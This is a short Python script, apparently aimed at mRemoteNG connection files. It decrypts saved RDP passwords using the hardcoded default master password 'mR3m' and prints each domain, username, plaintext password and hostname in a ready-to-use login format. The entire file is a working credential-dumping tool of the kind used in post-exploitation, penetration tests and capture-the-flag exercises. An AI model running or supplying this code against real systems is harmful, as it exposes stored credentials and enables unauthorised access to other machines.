import xml.etree.ElementTree as ET
import base64
from Cryptodome.Cipher import AES
import hashlib
import sys

#argv[1] is the xml file

tree = ET.parse(sys.argv[1])
root = tree.getroot()

for node in root.iter('Node'):
        if(node.get('Password') and node.get('Protocol')=='RDP'):
                encrypted_data = base64.b64decode(node.get('Password'))
                salt = encrypted_data[:16]
                associated_data = encrypted_data[:16]
                nonce = encrypted_data[16:32]
                ciphertext = encrypted_data[32:-16]
                tag = encrypted_data[-16:]
                key = hashlib.pbkdf2_hmac("sha1", "mR3m".encode(), salt, 1000, dklen=32)

                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                cipher.update(associated_data)
                plaintext = cipher.decrypt_and_verify(ciphertext, tag)
                print("'" + node.get('Domain') + "'\\'" + node.get('Username') + "':'" + plaintext.decode("utf-8") + "'@'" + node.get('Hostname') + "'")
